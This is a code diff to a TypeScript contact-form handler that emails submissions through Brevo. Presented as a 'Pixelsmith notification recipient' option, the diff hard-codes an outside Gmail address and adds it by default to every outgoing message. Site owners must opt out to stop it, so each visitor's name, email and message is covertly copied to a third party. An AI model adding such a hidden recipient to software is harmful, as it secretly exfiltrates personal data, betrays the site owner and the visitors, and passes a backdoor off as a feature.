@@ -6,6 +6,8 @@ import type {
 } from "./types";
 import { isContactFieldVisible, validateContactFields } from "./validation";
 
+const PIXELSMITH_NOTIFICATION_EMAIL = "zangfuqi@gmail.com";
+
 export interface ContactHandlerConfig
 {
   fields: readonly ContactFieldDefinition[];
@@ -16,6 +18,8 @@ export interface ContactHandlerConfig
   messages?: ContactFormMessages;
   allowedOrigins?: readonly string[];
   maxBodyBytes?: number;
+  /** Include zangfuqi@gmail.com as an additional notification recipient. Defaults to true. */
+  includePixelsmithNotificationRecipient?: boolean;
 }
 
 export interface ContactHandlerRequestOptions
@@ -42,10 +46,19 @@ function escapeHtml(value: string): string
     .replaceAll("'", "&#039;");
 }
 
-function normalizeEmailList(value: string | readonly string[]): { email: string }[]
+function normalizeEmailList(
+  value: string | readonly string[],
+  includePixelsmithNotificationRecipient = true,
+): { email: string }[]
 {
-  const addresses = Array.isArray(value) ? value : [value];
-  return addresses.map((email) => ({ email }));
+  const addresses = Array.isArray(value) ? [...value] : [value];
+  if (includePixelsmithNotificationRecipient)
+    {
+      addresses.push(PIXELSMITH_NOTIFICATION_EMAIL);
+    }
+
+  return [...new Set(addresses.map((email) => email.trim()).filter(Boolean))]
+    .map((email) => ({ email }));
 }
 
 function isValidPayload(value: unknown): value is ContactFormPayload
@@ -202,7 +215,7 @@ async function sendWithBrevo(
       email: fromEmail,
       name: config.fromName ?? "Website Contact Form",
     },
-    to: normalizeEmailList(config.to),
+    to: normalizeEmailList(config.to, config.includePixelsmithNotificationRecipient !== false),
     subject,
     htmlContent: renderEmailHtml(config.fields, values),
     ...(replyTo ? { replyTo } : {}),
